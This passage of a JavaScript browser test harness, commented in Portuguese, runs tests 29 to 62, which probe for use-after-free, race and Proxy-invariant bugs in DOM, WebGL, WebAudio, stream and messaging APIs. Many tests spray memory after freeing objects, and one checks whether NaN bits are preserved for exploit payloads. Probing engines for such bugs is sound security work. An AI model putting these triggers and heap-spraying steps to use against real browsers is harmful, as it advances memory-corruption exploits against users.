            if (res.length > 0 && res[0] === undefined) {
                log("ALERTA: Ghost element read via concat!", "alert");
            } else {
                log("Concat handled resize safely.", "ok");
            }
        } catch(e) { log(e); }
    }

    // --- TEST 29: Worker Transfer/Close Race (Race) ---
    function runTest29() {
        log("Iniciando Test 29: Worker Transfer Race...");
        var b = new Uint8Array(1024);
        var w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
        
        try {
            w.terminate(); // Kill worker immediately
            w.postMessage(b, [b.buffer]); // Try transfer to dead worker
            
            if (b.byteLength === 0) log("Buffer detached (Neutered).", "ok");
            else log("ALERTA: Buffer transfer failed or ignored!", "alert");
        } catch(e) { log("Error: " + e); }
    }

    // --- TEST 30: Proxy PreventExtensions Invariant (State) ---
    function runTest30() {
        log("Iniciando Test 30: Proxy Invariant...");
        var t = {}; // Extensible
        var p = new Proxy(t, {
            preventExtensions: function() {
                log("Intercepting preventExtensions. Returning true without action...");
                return true; // Claim success but do NOT make target non-extensible
            }
        });

        try {
            Object.preventExtensions(p);
            // Engine checks invariant: if trap returns true, target MUST be non-extensible
            var ext = Object.isExtensible(t);
            if (ext) log("ALERTA: Invariant Violation! Target still extensible.", "alert");
            else log("Target locked correctly.", "ok");
        } catch(e) {
            if (e instanceof TypeError) log("Engine caught invariant violation (Safe).", "ok");
            else log("Unknown Error: " + e);
        }
    }
// --- TEST 31: CSS Keyframes Rule Mutation UAF ---
    // Manipula regras de animação (@keyframes) via JS enquanto um elemento está sendo animado.
    // Tenta deletar a regra que o compositor está lendo.
    function runTest31() {
        log("Iniciando Test 31: CSS Keyframes UAF...");
        var style = document.createElement('style');
        document.head.appendChild(style);
        var sheet = style.sheet;
        
        // Cria animação
        sheet.insertRule("@keyframes boom { 0% { opacity: 0; } 100% { opacity: 1; } }", 0);
        
        var div = document.createElement('div');
        div.style.animation = "boom 1s infinite";
        document.body.appendChild(div);
        
        // Acessa a regra CSSKeyframesRule
        var keyframes = sheet.cssRules[0];
        
        // Thrashing: Remove e adiciona regras internas
        try {
            // Força reflow/style calc
            var x = div.offsetWidth;
            
            // Remove a regra '0%' enquanto a animação tenta interpolar
            log("Deletando regra 0%...");
            keyframes.deleteRule("0%");
            spray(); // Tenta preencher a memória da regra deletada
            
            // Força novo style calc
            div.style.color = "red";
            var y = div.offsetWidth;
            
            log("CSSOM manipulation survived.", "ok");
        } catch(e) { log("Error: " + e); }
        
        setTimeout(function(){ div.remove(); style.remove(); }, 100);
    }

    // --- TEST 32: WebGL Shader Detach/Link Race ---
    // Compila shaders, anexa ao programa, e então deleta/desanexa antes de linkar.
    function runTest32() {
        log("Iniciando Test 32: WebGL Shader Race...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl');
        if(!gl) return log("WebGL off");

        var p = gl.createProgram();
        var s = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(s, "void main(){gl_Position=vec4(0,0,0,1);}");
        gl.compileShader(s);
        gl.attachShader(p, s);
        
        // Destruição fora de ordem
        log("Desanexando e deletando shader antes do link...");
        gl.detachShader(p, s);
        gl.deleteShader(s);
        spray();
        
        try {
            // Tenta linkar programa com shader fantasma/removido
            gl.linkProgram(p);
            var linked = gl.getProgramParameter(p, gl.LINK_STATUS);
            log("Link attempt finished. Status: " + linked, "ok");
        } catch(e) { log("WebGL Error: " + e); }
    }

    // --- TEST 33: TextTrackCueList Index Access UAF ---
    // Vídeos HTML5 possuem faixas de texto (legendas).
    // Removemos a faixa (<track>) do DOM enquanto iteramos sobre sua lista de Cues.
    function runTest33() {
        log("Iniciando Test 33: TextTrack UAF...");
        var v = document.createElement('video');
        var t = v.addTextTrack("captions", "test", "en");
        t.mode = "showing";
        
        // Adiciona Cues
        t.addCue(new VTTCue(0, 1, "A"));
        t.addCue(new VTTCue(1, 2, "B"));
        
        var list = t.cues;
        
        try {
            // Acessa cue válida
            var c1 = list[0];
            
            log("Desabilitando e removendo track...");
            t.mode = "disabled";
            v = null; // Remove referência JS ao vídeo
            spray();
            
            // Tenta acessar lista de cues de uma track "morta"
            var len = list.length;
            var c2 = list[0];
            
            if (c2 && c2.text === "A") log("Acesso a TextTrackCue seguro.", "ok");
            else log("Objeto Cue inacessível ou corrompido.", "ok");
        } catch(e) { log("Error: " + e); }
    }

    // --- TEST 34: TypedArray.from Buffer Detach (Silent) ---
    // TypedArray.from aceita um iterável. Se o iterador desconectar (detach)
    // o buffer de origem ou destino durante a cópia, pode haver corrupção.
    function runTest34() {
        log("Iniciando Test 34: TypedArray Detach...");
        var iter = {
            [Symbol.iterator]: function() {
                var i = 0;
                return {
                    next: function() {
                        i++;
                        if (i === 2) {
                            log("Iterador passo 2. Disparando detach...");
                            // Simula detach via Worker
                            try {
                                var w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                                w.postMessage(ab, [ab]); 
                            } catch(e){}
                        }
                        return { value: 1, done: i > 5 };
                    }
                };
            }
        };

        var ab = new ArrayBuffer(100);
        try {
            // Cria array a partir do iterador suicida
            var res = Uint8Array.from(iter);
            log("Array length: " + res.length);
            
            // Se o buffer foi detachado, o array resultante deve ser seguro (zerado ou erro)
            if (ab.byteLength === 0) log("Buffer detachado corretamente.", "ok");
            else log("Buffer não detachado (Safe).", "ok");
        } catch(e) { log("Erro capturado (Safe): " + e.name, "ok"); }
    }

    // --- TEST 35: MessagePort Self-Transfer Check (State) ---
    // Tenta transferir uma MessagePort para dentro de sua própria mensagem.
    // Isso deve gerar um DataCloneError. Se passar, cria um ciclo de referência impossível.
    function runTest35() {
        log("Iniciando Test 35: Port Self-Transfer...");
        var mc = new MessageChannel();
        try {
            // Tenta enviar port1 através da port1
            mc.port1.postMessage("suicide", [mc.port1]);
            log("ALERTA: Motor permitiu auto-transferência de porta!", "alert");
        } catch(e) {
            if (e.name === "DataCloneError") log("Motor bloqueou auto-transferência (Safe).", "ok");
            else log("Erro inesperado: " + e.name);
        }
    }

    // --- TEST 36: RegExp Exec Re-entry Recursion (Race) ---
    // Executa um RegExp. Dentro do getter da string sendo processada,
    // executa O MESMO RegExp em outra string. Isso testa a reentrância da engine de Regex.
    function runTest36() {
        log("Iniciando Test 36: RegExp Re-entry...");
        var re = /A/g;
        var count = 0;
        
        var evilStr = {
            toString: function() {
                count++;
                if (count === 1) {
                    log("Re-entrando no RegExp...");
                    // Re-executa o MESMO regex no meio do processamento
                    re.exec("A"); 
                }
                return "A";
            }
        };

        try {
            re.exec(evilStr);
            // Verifica estado interno
            if (re.lastIndex !== 0) log("RegExp state: " + re.lastIndex, "ok");
            else log("RegExp resetou corretamente.", "ok");
        } catch(e) { log("Erro: " + e); }
    }
// --- TEST 37: AudioBuffer Detach during Playback (UAF) ---
    // Inicia a reprodução de um buffer de áudio e imediatamente o transfere (detach)
    // para um Worker. Se a thread de áudio tentar ler o buffer agora neutro/inválido
    // sem locking apropriado, ocorre um Use-After-Free ou Crash.
    function runTest37() {
        log("Iniciando Test 37: Audio Buffer Detach...");
        var ctx = new (window.AudioContext || window.webkitAudioContext)();
        var b = ctx.createBuffer(1, 44100, 44100);
        var src = ctx.createBufferSource();
        src.buffer = b;
        src.connect(ctx.destination);
        src.start();

        // Worker para roubar o buffer
        var w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(e){}"],{type:'text/js'})));
        
        try {
            // Tenta transferir o ArrayBuffer subjacente enquanto toca
            // A API WebAudio moderna tenta prevenir isso, mas implementações antigas falham
            var ab = b.getChannelData(0).buffer;
            w.postMessage(ab, [ab]);
            
            if (ab.byteLength === 0) log("Buffer detachado durante playback!", "ok");
            else log("Buffer bloqueado ou copiado (Safe).", "ok");
            
            // Spray para preencher lacuna se houve UAF
            spray();
        } catch(e) { log("Erro/Proteção: " + e.message); }
    }

    // --- TEST 38: Range.surroundContents Mutation (Crash) ---
    // surroundContents move nós para um novo pai.
    // Se removermos o pai ou os nós durante o processo via eventos de mutação,
    // o motor DOM pode perder referência.
    function runTest38() {
        log("Iniciando Test 38: Range Surround...");
        var d = document.createElement('div');
        var p = document.createElement('p');
        p.textContent = "CrashTarget";
        d.appendChild(p);
        document.body.appendChild(d);

        var r = document.createRange();
        r.selectNode(p);

        var newParent = document.createElement('div');
        
        // Armadilha
        newParent.appendChild = function(node) {
            log("Append hook. Destruindo estrutura...");
            d.remove(); // Remove o container original
            spray();
            return Node.prototype.appendChild.call(this, node);
        };

        try {
            r.surroundContents(newParent);
            log("Range operation survived.", "ok");
        } catch(e) { log("Erro DOM: " + e); }
    }

    // --- TEST 39: WebGL2 TransformFeedback Active Delete ---
    // TransformFeedback captura saída da GPU.
    // Deletar o objeto TF enquanto ele está ativo (PAUSED ou ACTIVE) é perigoso.
    function runTest39() {
        log("Iniciando Test 39: WebGL2 TF Delete...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl2');
        if(!gl) return log("WebGL2 off");

        var tf = gl.createTransformFeedback();
        gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
        
        var b = gl.createBuffer();
        gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, b);
        gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 1024, gl.DYNAMIC_COPY);

        gl.beginTransformFeedback(gl.POINTS);
        
        // Deleta enquanto ativo
        log("Deletando TF ativo...");
        gl.deleteTransformFeedback(tf);
        spray();

        try {
            gl.endTransformFeedback(); // Tenta finalizar objeto morto
            log("WebGL state handled.", "ok");
        } catch(e) { log("WebGL Error: " + e); }
    }

    // --- TEST 40: Float64/BigInt64 Bitwise Aliasing (Silent) ---
    // Usa um ArrayBuffer compartilhado para verificar se o motor preserva bits
    // de NaN (Signaling NaNs) ou se os normaliza (o que destrói payloads de exploits).
    function runTest40() {
        log("Iniciando Test 40: Bitwise Aliasing...");
        if (!window.BigInt64Array) return log("BigInt off");

        var b = new ArrayBuffer(8);
        var f64 = new Float64Array(b);
        var u64 = new BigInt64Array(b);

        // Um padrão de bits específico (NaN com payload)
        var payload = 0x7FF0000000000001n; 
        u64[0] = payload;

        // Lê como float
        var val = f64[0];

        // Se o motor normalizou o NaN, os bits mudaram
        if (Number.isNaN(val)) {
            // Lê de volta como int
            var check = u64[0];
            if (check === payload) {
                log("Bits preservados (Raw Memory Access).", "ok");
            } else {
                log("ALERTA: NaN Canonicalization detectada (Bits alterados).", "alert");
            }
        }
    }

    // --- TEST 41: Proxy DefineProperty Invariant (State) ---
    // Tenta definir uma propriedade não configurável em um objeto não extensível
    // através de um Proxy que mente sobre o sucesso.
    function runTest41() {
        log("Iniciando Test 41: Proxy DefineProperty...");
        var t = {};
        Object.preventExtensions(t); // Travado

        var p = new Proxy(t, {
            defineProperty: function(target, key, desc) {
                log("Interceptando defineProperty. Retornando true (mentira)...");
                return true; 
            }
        });

        try {
            // Tenta adicionar propriedade 'x'.
            // O trap retorna true, mas o alvo é não extensível.
            // O motor DEVE lançar TypeError se respeitar a spec.
            Object.defineProperty(p, 'x', { value: 1 });
            
            // Se chegou aqui...
            log("ALERTA: Motor aceitou definição ilegal em objeto travado!", "alert");
        } catch(e) {
            if (e instanceof TypeError) log("Motor bloqueou violação (Safe).", "ok");
            else log("Erro desconhecido: " + e);
        }
    }

    // --- TEST 42: BroadcastChannel Message Race (Race) ---
    // Envia mensagem e fecha o canal imediatamente.
    // Tenta reabrir e ler na mesma origem para ver se a mensagem "fantasma" chega.
    function runTest42() {
        log("Iniciando Test 42: Broadcast Race...");
        var name = "race_channel_" + Math.random();
        var bc1 = new BroadcastChannel(name);
        var bc2 = new BroadcastChannel(name);

        bc2.onmessage = function(e) {
            log("Mensagem recebida: " + e.data, "ok");
        };

        // Race: Postar e fechar na mesma tick
        bc1.postMessage("test");
        bc1.close();
        
        // Tenta confundir o bus de mensagens
        try {
            bc1.postMessage("ghost"); // Deve falhar
        } catch(e) {}
        
        setTimeout(function() {
            bc2.close();
            log("Teste finalizado.", "ok");
        }, 100);
    }
 // --- TEST 43: ReadableStream Tee Cancel UAF ---
    // Clona (tee) uma stream, cancela um braço e lê o outro.
    // Tenta forçar o fechamento do controlador subjacente enquanto uma leitura está pendente.
    function runTest43() {
        log("Iniciando Test 43: Stream Tee UAF...");
        try {
            var stream = new ReadableStream({
                start: function(controller) {
                    controller.enqueue("chunk");
                    controller.close();
                }
            });
            
            var branches = stream.tee();
            var reader1 = branches[0].getReader();
            var reader2 = branches[1].getReader();
            
            // Cancela branch 1 e tenta ler branch 2 imediatamente
            branches[0].cancel("reason");
            reader1.releaseLock(); // Libera
            
            spray(); // Tenta corromper estado interno do controller compartilhado
            
            reader2.read().then(function(res) {
                log("Stream read safe: " + res.value, "ok");
            }).catch(function(e) { log("Stream error: " + e); });
            
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 44: WebGL VertexAttribPointer Buffer Swap ---
    // Define um ponteiro de atributo para um buffer, deleta esse buffer,
    // e cria um novo buffer (menor) que pode ocupar o mesmo slot de memória.
    // Se o driver não atualizar o ponteiro, ele lê além do limite do novo buffer.
    function runTest44() {
        log("Iniciando Test 44: WebGL Vertex UAF...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl');
        if(!gl) return log("WebGL off");

        var b1 = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, b1);
        gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(1024), gl.STATIC_DRAW);
        
        gl.vertexAttribPointer(0, 4, gl.FLOAT, false, 0, 0);
        gl.enableVertexAttribArray(0);
        
        // Deleta e substitui
        gl.deleteBuffer(b1);
        
        var b2 = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, b2);
        gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(16), gl.STATIC_DRAW); // Muito menor
        
        // Tenta desenhar. O ponteiro antigo (tamanho 1024) ainda está ativo no driver?
        // Se estiver, e ele usar a memória de b2 (tamanho 16), vai ler lixo.
        try {
            gl.drawArrays(gl.POINTS, 0, 10);
            log("WebGL Draw Call handled.", "ok");
        } catch(e) { log("WebGL Error: " + e); }
    }

    // --- TEST 45: HTMLOptionsCollection Length Setter GC Crash ---
    // Manipula a propriedade 'length' de um <select> para truncar opções.
    // Isso dispara destruição de elementos DOM. Se feito durante iteração ou evento...
    function runTest45() {
        log("Iniciando Test 45: Options GC Crash...");
        var s = document.createElement('select');
        for(var i=0; i<100; i++) {
            var o = document.createElement('option');
            o.text = "opt" + i;
            s.add(o);
        }
        
        // Armadilha no getter de um elemento que será deletado
        Object.defineProperty(s.options[50], 'selected', {
            get: function() {
                log("Getter acionado. Truncando select...");
                s.length = 0; // Destrói todas as opções
                spray();
                return true;
            }
        });

        try {
            // Acessa propriedade que pode disparar o getter
            var val = s.options[50].selected;
            log("Select length truncated safely.", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 46: Array.splice Proxy Resize (Silent) ---
    // splice() move elementos. Se encolhermos o array via Proxy durante a operação,
    // o algoritmo pode copiar dados para índices que não existem mais.
    function runTest46() {
        log("Iniciando Test 46: Splice Proxy...");
        var arr = [1, 2, 3, 4, 5];
        var p = new Proxy(arr, {
            get: function(t, k) {
                if (k === '2') {
                    log("Acessando índice 2. Encolhendo...");
                    t.length = 1;
                    spray();
                }
                return t[k];
            }
        });

        try {
            // splice(start, deleteCount)
            // Tenta deletar itens a partir do 0. O motor itera.
            Array.prototype.splice.call(p, 0, 3);
            
            if (arr.length === 1 && arr[0] === 1) {
                log("Splice respeitou o resize.", "ok");
            } else {
                log("ALERTA: Estado de array inconsistente após splice!", "alert");
            }
        } catch(e) { log(e); }
    }

    // --- TEST 47: CacheStorage Match/Delete Race (Race) ---
    // CacheStorage opera em disco/rede. Disputa entre ler e apagar a mesma entrada.
    function runTest47() {
        log("Iniciando Test 47: Cache Race...");
        if (!window.caches) return log("Cache API off");
        
        var name = "race-v1";
        var req = "/test-race";
        
        caches.open(name).then(function(c) {
            c.put(req, new Response("data")).then(function() {
                // Race: Match vs Delete
                var p1 = c.match(req);
                var p2 = c.delete(req);
                
                Promise.all([p1, p2]).then(function(res) {
                    // res[0] é match, res[1] é delete success (bool)
                    log("Race concluída. Match: " + (!!res[0]) + ", Delete: " + res[1], "ok");
                });
            });
        });
    }

    // --- TEST 48: Proxy getOwnPropertyDescriptor Invariant (State) ---
    // Um Proxy deve reportar descritores compatíveis com o alvo.
    // Se o alvo tem propriedade não-configurável, o proxy não pode dizer que é configurável.
    function runTest48() {
        log("Iniciando Test 48: Proxy Descriptor Invariant...");
        var t = {};
        Object.defineProperty(t, 'prop', { value: 1, configurable: false });
        
        var p = new Proxy(t, {
            getOwnPropertyDescriptor: function(target, key) {
                log("Interceptando descriptor. Mentindo (configurable: true)...");
                return { value: 1, configurable: true, writable: true, enumerable: true };
            }
        });

        try {
            Object.getOwnPropertyDescriptor(p, 'prop');
            log("ALERTA: Motor aceitou descritor ilegal!", "alert");
        } catch(e) {
            if (e instanceof TypeError) log("Motor aplicou regra de segurança (Safe).", "ok");
            else log("Erro desconhecido: " + e);
        }
    }
 // --- TEST 49: AudioParam Automation Removal UAF ---
    // Agenda automações de áudio e tenta cancelar/desconectar o nó 
    // enquanto a thread de áudio processa a curva de automação.
    function runTest49() {
        log("Iniciando Test 49: Audio Param UAF...");
        try {
            var ctx = new (window.AudioContext || window.webkitAudioContext)();
            var osc = ctx.createOscillator();
            var gain = ctx.createGain();
            
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();

            // Agenda milhares de eventos
            var t = ctx.currentTime;
            for(var i=0; i<2000; i++) {
                gain.gain.setValueAtTime(Math.random(), t + i*0.001);
                gain.gain.linearRampToValueAtTime(Math.random(), t + i*0.001 + 0.0005);
            }

            // Destroi abruptamente
            setTimeout(function() {
                gain.disconnect();
                osc.stop();
                try { gain.gain.cancelScheduledValues(0); } catch(e){}
                ctx.close();
                spray();
                log("Audio automation stress complete.", "ok");
            }, 50);
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 50: execCommand Mutation UAF ---
    // Executa um comando de edição de rich text.
    // Usa eventos de mutação para remover o nó que está sendo editado 
    // durante a execução do comando.
    function runTest50() {
        log("Iniciando Test 50: execCommand UAF...");
        var d = document.createElement('div');
        d.contentEditable = true;
        document.body.appendChild(d);
        var s = document.createElement('span');
        s.textContent = "edit me";
        d.appendChild(s);
        
        // Seleciona o span
        var sel = window.getSelection();
        var r = document.createRange();
        r.selectNode(s);
        sel.removeAllRanges();
        sel.addRange(r);

        // Armadilha
        d.addEventListener('DOMNodeInserted', function() {
            log("DOM Inserted. Removendo container...");
            d.remove();
            spray();
        });

        try {
            // Insere HTML, disparando evento de inserção, que remove o pai 'd'.
            // O motor tenta continuar a edição em 'd' ou 's' mortos?
            document.execCommand('insertHTML', false, '<b>bold</b>');
            log("execCommand handled.", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 51: WebGL Instanced Attrib Buffer Swap ---
    // Usa Instanced Arrays (ANGLE_instanced_arrays).
    // Configura divisor de atributo, deleta buffer, troca por menor e desenha.
    function runTest51() {
        log("Iniciando Test 51: WebGL Instanced UAF...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl');
        var ext = gl ? gl.getExtension('ANGLE_instanced_arrays') : null;
        if(!ext) return log("WebGL Instanced Arrays off");

        var b1 = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, b1);
        gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(1024), gl.STATIC_DRAW);
        
        gl.enableVertexAttribArray(0);
        gl.vertexAttribPointer(0, 4, gl.FLOAT, false, 0, 0);
        ext.vertexAttribDivisorANGLE(0, 1); // Instanced

        // Swap
        gl.deleteBuffer(b1);
        var b2 = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, b2);
        gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(16), gl.STATIC_DRAW);

        try {
            ext.drawArraysInstancedANGLE(gl.POINTS, 0, 10, 100);
            log("Instanced draw executed.", "ok");
        } catch(e) { log("WebGL Error: " + e); }
    }

    // --- TEST 52: Array.lastIndexOf Proxy Resize (Silent) ---
    // lastIndexOf itera de trás para frente.
    // Se redimensionarmos o array para 0 quando ele lê o último elemento,
    // ele pode continuar lendo índices negativos ou memória inválida?
    function runTest52() {
        log("Iniciando Test 52: lastIndexOf Resize...");
        var arr = [1, 2, 3, 4];
        var p = new Proxy(arr, {
            get: function(t, k) {
                if (k === '3') {
                    log("Lendo índice 3. Zerando array...");
                    t.length = 0;
                    spray();
                }
                return t[k];
            }
        });

        try {
            var idx = Array.prototype.lastIndexOf.call(p, 1);
            if (idx !== -1) {
                // Se encontrou o '1' (que estava no índice 0) depois do resize,
                // significa que leu a memória corretamente apesar do length=0.
                log("Busca completou com array zerado (Safe).", "ok");
            } else {
                log("Elemento perdido (Safe behavior).", "ok");
            }
        } catch(e) { log(e); }
    }

    // --- TEST 53: Fetch Stream Abort Race (Race) ---
    // Inicia um fetch, pega o reader da stream, e aborta via AbortController
    // simultaneamente a uma leitura (read).
    function runTest53() {
        log("Iniciando Test 53: Fetch Abort Race...");
        var ac = new AbortController();
        
        // Simula fetch (ou usa real se online)
        var stream = new ReadableStream({
            pull: function(c) {
                // Tenta abortar DENTRO do pull
                ac.abort();
                c.enqueue(new Uint8Array([1]));
            }
        });

        var reader = stream.getReader();

        // Race
        var pRead = reader.read();
        
        pRead.then(function(res) {
            log("Leitura completou: " + res.done, "ok");
        }).catch(function(e) {
            log("Erro de leitura (Abortado): " + e.name, "ok");
        });
    }

    // --- TEST 54: Proxy setPrototypeOf Invariant (State) ---
    // Se um alvo é não-extensível, o Proxy NÃO pode alterar seu protótipo.
    // Tenta retornar true no trap 'setPrototypeOf' mas falha na ação real.
    function runTest54() {
        log("Iniciando Test 54: Proxy setProto Invariant...");
        var t = {};
        Object.preventExtensions(t);
        
        var p = new Proxy(t, {
            setPrototypeOf: function(target, proto) {
                log("Interceptando setPrototypeOf. Mentindo (true)...");
                return true; // Diz que mudou
            }
        });

        try {
            // Tenta mudar para Array.prototype
            // Como 't' é travado e o proto original é Object.prototype, isso é ilegal.
            // Se o trap retorna true, o motor DEVE checar se o proto realmente mudou.
            Object.setPrototypeOf(p, Array.prototype);
            log("ALERTA: Motor permitiu violação de invariante de protótipo!", "alert");
        } catch(e) {
            if (e instanceof TypeError) log("Motor bloqueou violação (Safe).", "ok");
            else log("Erro desconhecido: " + e);
        }
    }
 // --- TEST 55: Selection.deleteFromDocument Mutation UAF ---
    // A API de Seleção permite deletar conteúdo selecionado.
    // Se a deleção disparar eventos de mutação que removem o nó pai da seleção
    // antes da operação terminar, o motor pode acessar memória inválida.
    function runTest55() {
        log("Iniciando Test 55: Selection Delete UAF...");
        var d = document.createElement('div');
        d.contentEditable = true;
        var s = document.createElement('span');
        s.textContent = "delete me";
        d.appendChild(s);
        document.body.appendChild(d);

        var sel = window.getSelection();
        var r = document.createRange();
        r.selectNodeContents(s);
        sel.removeAllRanges();
        sel.addRange(r);

        // Armadilha
        d.addEventListener('DOMNodeRemoved', function() {
            log("DOM Mutation fired. Destroying container...");
            d.remove(); // Remove o container enquanto o engine processa o span
            spray();
        });

        try {
            sel.deleteFromDocument();
            log("Selection delete handled.", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 56: ReadableStream PipeTo Cancel Logic Error ---
    // Cria um pipe entre streams. Cancela o destino e fecha a fonte simultaneamente.
    // Tenta confundir a máquina de estados interna do piping.
    function runTest56() {
        log("Iniciando Test 56: Stream Pipe Race...");
        try {
            var rs = new ReadableStream({
                start: function(c) { c.enqueue("a"); c.close(); }
            });
            var ws = new WritableStream({
                write: function(chunk) { return new Promise(function(r){ setTimeout(r, 10); }); },
                close: function() { log("Writable closed."); },
                abort: function() { log("Writable aborted."); }
            });

            // Inicia pipe
            var p = rs.pipeTo(ws);

            // Race: Aborta o writable enquanto o pipe está ativo
            // O pipe deve lidar com o erro e parar de ler do Readable
            setTimeout(function() {
                try {
                    ws.abort(); 
                    log("Abort signal sent.");
                } catch(e) {}
            }, 0);

            p.then(function() { log("Pipe finished normally."); })
             .catch(function(e) { log("Pipe error handled: " + e, "ok"); });

        } catch(e) { log("Stream Error: " + e); }
    }

    // --- TEST 57: WebGL VertexArrayObject Delete Race ---
    // (WebGL 2) VAOs armazenam estado de atributos.
    // Deletar um VAO enquanto ele está vinculado e sendo usado em draw calls.
    function runTest57() {
        log("Iniciando Test 57: WebGL VAO Race...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl2');
        if(!gl) return log("WebGL2 off");

        var vao = gl.createVertexArray();
        gl.bindVertexArray(vao);

        var b = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, b);
        gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(100), gl.STATIC_DRAW);
        gl.enableVertexAttribArray(0);
        gl.vertexAttribPointer(0, 1, gl.BYTE, false, 0, 0);

        // Deleta VAO ativo
        log("Deletando VAO ativo...");
        gl.deleteVertexArray(vao);
        spray();

        try {
            // Tenta desenhar. O estado deve voltar ao VAO default ou gerar erro
            gl.drawArrays(gl.POINTS, 0, 10);
            log("WebGL Draw survived VAO deletion.", "ok");
        } catch(e) { log("WebGL Error: " + e); }
    }

    // --- TEST 58: Array.fill Proxy Resize Trap (Silent) ---
    // Array.fill deve preencher o array.
    // Usamos um Proxy para interceptar a escrita. Se no meio do preenchimento
    // reduzirmos o tamanho do array, o motor pode continuar escrevendo OOB?
    function runTest58() {
        log("Iniciando Test 58: Array Fill Trap...");
        var arr = [1, 2, 3, 4, 5];
        var p = new Proxy(arr, {
            set: function(t, k, v) {
                if (k === '2') {
                    log("Escrevendo índice 2. Encolhendo array...");
                    t.length = 1;
                    spray();
                }
                t[k] = v;
                return true;
            }
        });

        try {
            // Fill tenta escrever de 0 a 5
            Array.prototype.fill.call(p, 9);
            
            // Verifica integridade
            if (arr.length === 1 && arr[0] === 9) {
                log("Fill respeitou o resize.", "ok");
            } else if (arr.length > 1) {
                log("ALERTA: Array cresceu ou ignorou resize!", "alert");
            }
        } catch(e) { log(e); }
    }

    // --- TEST 59: MessagePort Double Transfer (Race/Crash) ---
    // Tenta transferir a MESMA porta duas vezes na lista de transferência.
    // Isso é um teste clássico de vulnerabilidade de "Double Free" no IPC.
    function runTest59() {
        log("Iniciando Test 59: Port Double Transfer...");
        var mc = new MessageChannel();
        try {
            // Transfer list: [port1, port1]
            // O motor deve detectar duplicata e lançar DataCloneError.
            // Se falhar, tenta liberar o mesmo ponteiro duas vezes no kernel/processo.
            window.postMessage("crash", "*", [mc.port1, mc.port1]);
            
            log("ALERTA: Motor aceitou transferência duplicada!", "alert");
        } catch(e) {
            if (e.name === "DataCloneError") log("Motor bloqueou duplicata (Safe).", "ok");
            else log("Erro desconhecido: " + e.name);
        }
    }

    // --- TEST 60: Object.isFrozen Proxy Invariant (State) ---
    // Um Proxy deve retornar o mesmo status de congelamento que o alvo.
    // Se o alvo não é congelado, o Proxy não pode dizer que é.
    function runTest60() {
        log("Iniciando Test 60: Proxy Frozen Invariant...");
        var t = {}; // Não congelado
        
        var p = new Proxy(t, {
            isExtensible: function() { return false; }, // Diz que não é extensível
            getOwnPropertyDescriptor: function() {
                return { configurable: false, writable: false }; // Diz que props são fixas
            }
            // Mas não implementamos todas as traps perfeitamente
        });

        // Este teste é sutil: Object.isFrozen checa extensibilidade E descritores.
        // Se tentarmos enganar o motor retornando 'false' para extensibilidade
        // mas o objeto real for extensível, violamos a invariante.
        try {
            Object.preventExtensions(t); // Agora t é não-extensível
            
            var p2 = new Proxy(t, {
                isExtensible: function() { return true; } // Mentira: diz que é extensível
            });
            
            var res = Object.isExtensible(p2);
            log("ALERTA: Invariante violada! Proxy extensível com alvo travado.", "alert");
        } catch(e) {
            if (e instanceof TypeError) log("Motor detectou violação de invariante (Safe).", "ok");
            else log("Erro: " + e);
        }
    }
 // --- TEST 61: SVG Animation Element Target UAF ---
    // Cria um elemento SVG <animate> que aponta para um alvo.
    // Remove o alvo do DOM durante o ciclo de atualização da animação.
    function runTest61() {
        log("Iniciando Test 61: SVG Animate UAF...");
        var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        var target = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        target.id = "boom";
        var anim = document.createElementNS("http://www.w3.org/2000/svg", "animate");
        anim.setAttribute("xlink:href", "#boom");
        anim.setAttribute("attributeName", "x");
        
        svg.appendChild(target);
        svg.appendChild(anim);
        document.body.appendChild(svg);

        // Dispara evento de tempo
        try {
            svg.pauseAnimations();
            target.remove(); // Remove o alvo referenciado
            target = null;
            spray();
            svg.unpauseAnimations(); // Motor tenta atualizar 'x' no alvo morto?
            log("SVG Animation tick handled.", "ok");
        } catch(e) { log("Error: " + e); }
        setTimeout(function(){ svg.remove(); }, 100);
    }

    // --- TEST 62: WebAudio AudioParam Timeline UAF ---
    // Manipula a timeline de eventos de um AudioParam (setValueCurveAtTime).
    // Tenta cancelar eventos e desconectar o nó enquanto a curva está sendo processada.
    function runTest62() {
        log("Iniciando Test 62: AudioParam Curve UAF...");
        try {
            var ctx = new (window.AudioContext || window.webkitAudioContext)();
            var src = ctx.createConstantSource();
            src.start();
            var curve = new Float32Array(100).fill(0.5);
            
            // Agenda curva
            src.offset.setValueCurveAtTime(curve, ctx.currentTime, 0.1);
            
            // Interrompe violentamente no meio do processamento da curva
            setTimeout(function() {
                try {
                    src.offset.cancelScheduledValues(0);
                    src.disconnect();
                    src = null;
                    curve = null; // Libera o Float32Array
                    spray(); // Tenta sobrescrever a memória da curva
                    ctx.close();
                    log("Audio curve interruption safe.", "ok");
                } catch(e) {}
            }, 10);
        } catch(e) { log("Audio Init Error: " + e); }
    }

